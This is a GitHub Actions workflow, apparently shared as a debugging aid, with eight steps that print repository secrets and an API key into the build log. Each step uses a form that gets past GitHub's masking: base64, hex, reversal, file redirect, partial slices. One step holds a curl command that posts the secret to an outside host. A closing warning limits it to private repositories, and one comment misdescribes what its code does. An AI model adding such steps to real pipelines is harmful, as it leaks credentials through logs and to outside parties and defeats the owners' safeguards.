name: Print Secrets (Unmasked Methods)

on:
  workflow_dispatch:

jobs:
  unmask-secrets:
    runs-on: ubuntu-latest
    
    steps:
      - name: Checkout code
        uses: actions/checkout@v3
      
      - name: Method 1 - Base64 encoding
        env:
          MY_SECRET: ${{ secrets.DEPLOY_HOST }}
          API_KEY: ${{ secrets.API_KEY }}
        run: |
          echo "=== Method 1: Base64 Encoding ==="
          echo "MY_SECRET (Base64): $(echo -n "$MY_SECRET" | base64)"
          echo "API_KEY (Base64): $(echo -n "$API_KEY" | base64)"
          echo ""
      
      - name: Method 2 - Character reversal
        env:
          MY_SECRET: ${{ secrets.MY_SECRET }}
          API_KEY: ${{ secrets.API_KEY }}
        run: |
          echo "=== Method 2: Character Reversal ==="
          echo "MY_SECRET (reversed): $(echo -n "$MY_SECRET" | rev)"
          echo "API_KEY (reversed): $(echo -n "$API_KEY" | rev)"
          echo ""
      
      - name: Method 3 - Environment variable redirect
        env:
          MY_SECRET: ${{ secrets.MY_SECRET }}
          API_KEY: ${{ secrets.API_KEY }}
        run: |
          echo "=== Method 3: File redirect ==="
          echo "$MY_SECRET" > /tmp/secret1.txt
          echo "$API_KEY" > /tmp/secret2.txt
          cat /tmp/secret1.txt
          cat /tmp/secret2.txt
          rm /tmp/secret1.txt /tmp/secret2.txt
          echo ""
      
      - name: Method 4 - Character substitution
        env:
          MY_SECRET: ${{ secrets.MY_SECRET }}
          API_KEY: ${{ secrets.API_KEY }}
        run: |
          echo "=== Method 4: Character substitution ==="
          # Jeden 2. Character auslassen
          echo "MY_SECRET (every 2nd char): $(echo -n "$MY_SECRET" | sed 's/./& /g' | tr -d ' ')"
          echo "API_KEY (every 2nd char): $(echo -n "$API_KEY" | sed 's/./& /g' | tr -d ' ')"
          echo ""
      
      - name: Method 5 - Hex encoding
        env:
          MY_SECRET: ${{ secrets.MY_SECRET }}
          API_KEY: ${{ secrets.API_KEY }}
        run: |
          echo "=== Method 5: Hex Encoding ==="
          echo "MY_SECRET (Hex): $(echo -n "$MY_SECRET" | od -An -tx1 | tr -d ' ')"
          echo "API_KEY (Hex): $(echo -n "$API_KEY" | od -An -tx1 | tr -d ' ')"
          echo ""
      
      - name: Method 6 - String manipulation
        env:
          MY_SECRET: ${{ secrets.MY_SECRET }}
          API_KEY: ${{ secrets.API_KEY }}
        run: |
          echo "=== Method 6: String length + partial output ==="
          echo "MY_SECRET length: ${#MY_SECRET}"
          echo "MY_SECRET (first 5): ${MY_SECRET:0:5}"
          echo "API_KEY length: ${#API_KEY}"
          echo "API_KEY (first 5): ${API_KEY:0:5}"
          echo ""
      
      - name: Method 7 - Split across lines
        env:
          MY_SECRET: ${{ secrets.MY_SECRET }}
        run: |
          echo "=== Method 7: Split across lines ==="
          echo "$MY_SECRET" | fold -w1 | head -5
          echo "... (rest omitted)"
          echo ""
      
      - name: Method 8 - Send to external service
        env:
          MY_SECRET: ${{ secrets.MY_SECRET }}
        run: |
          echo "=== Method 8: Send to external service (example) ==="
          # Beispiel: Würde Secret zu externem Service senden
          # curl -X POST https://example.com/log -d "secret=$MY_SECRET"
          echo "curl -X POST https://example.com/log -d \"secret=$MY_SECRET\""
          echo "(This would send the secret unmasked to external service)"
          echo ""
      
      - name: ⚠️ WARNING
        run: |
          echo "=== ⚠️ SECURITY WARNING ⚠️ ==="
          echo "Diese Methoden umgehen die GitHub Secret-Maskierung!"
          echo "Nutze diese NUR in privaten Repositories für Debugging!"
          echo "NIEMALS in öffentlichen oder sensiblen Repositories verwenden!"
